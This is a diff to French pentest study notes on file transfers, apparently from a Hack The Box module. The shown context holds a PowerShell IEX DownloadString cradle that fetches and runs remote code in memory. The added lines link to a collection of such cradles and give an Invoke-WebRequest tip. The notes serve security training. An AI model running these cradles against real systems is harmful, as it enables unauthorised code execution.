@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-22T14:25:35.004Z
+date: 2025-03-22T14:29:43.799Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -100,4 +100,7 @@ IEX (New-Object Net.WebClient).DownloadString('<URL>')
 Invoke-WebRequest <URL> -OutFile <fichier>
 ```
 
+Une petite liste de "cradles" (technique utilisée pour télécharger et exécuter du code malveillant directement en mémoire) est disponible [ici](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
 
+Parfois Internet Explorer doit être lancé au moins une première fois avant d'exécuter Invoke-WebRequest.
+Pour résoudre ce problème il est possible d'utiliser l'option "-UseBasicParsing"
